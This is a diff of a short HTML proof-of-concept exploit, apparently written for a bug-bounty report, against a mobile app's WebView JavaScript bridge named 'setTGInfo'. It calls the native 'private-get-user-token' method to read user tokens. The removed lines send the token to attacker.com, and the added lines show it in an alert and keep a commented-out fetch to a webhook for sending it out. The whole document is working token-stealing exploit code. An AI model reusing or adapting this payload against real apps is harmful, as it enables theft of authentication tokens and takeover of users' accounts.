@@ -1,8 +1,17 @@
-<script>
-    // Since 'setTGInfo' is the bridge name you found:
-    try {
-        window.setTGInfo.callNative('private-get-user-token', {}, (res) => {
-            fetch('https://attacker.com/log?token=' + btoa(JSON.stringify(res)));
-        });
-    } catch(e) { alert(e); }
-</script>
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // Use the bridge name found in BIDSWebViewActivity
+        if (window.setTGInfo && window.setTGInfo.callNative) {
+            window.setTGInfo.callNative('private-get-user-token', {"type":"all"}, function(res) {
+                alert("P1 Confirmed: " + JSON.stringify(res));
+                // Send to your remote listener if needed
+                // fetch('https://your-webhook.com/?data=' + btoa(JSON.stringify(res)));
+            });
+        } else {
+            document.write("Bridge 'setTGInfo' not detected.");
+        }
+    <\/script>
+</body>
+</html>
